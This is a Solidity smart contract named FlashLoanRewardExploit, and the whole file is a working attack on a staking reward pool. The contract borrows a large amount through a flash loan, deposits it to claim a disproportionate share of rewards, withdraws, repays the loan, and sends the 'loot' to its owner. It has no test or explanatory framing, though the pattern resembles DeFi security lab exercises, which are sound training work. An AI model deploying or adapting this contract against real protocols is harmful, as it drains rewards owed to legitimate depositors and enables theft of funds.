// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// âœ… Include this interface
interface IFlashLoanProvider {
    function executeFlashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimReward() external;
    function rewardToken() external view returns (address);
    function stakeToken() external view returns (address);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract FlashLoanRewardExploit {
    address public owner;
    IFlashLoanProvider public provider;
    IRewardPool public pool;
    IERC20 public stakeToken;
    IERC20 public rewardToken;

    constructor(address _provider, address _pool) {
        provider = IFlashLoanProvider(_provider);
        pool = IRewardPool(_pool);
        stakeToken = IERC20(pool.stakeToken());
        rewardToken = IERC20(pool.rewardToken());
        owner = msg.sender;
    }

    function executeAttack(uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        provider.executeFlashLoan(amount);
    }

    function executeOnFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(provider), "Only loan provider");

        // Exploit: temporarily deposit large amount
        stakeToken.approve(address(pool), amount);
        pool.deposit(amount);
        pool.claimReward();
        pool.withdraw(amount);

        // Repay flash loan
        stakeToken.transfer(address(provider), amount + fee);
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner");
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
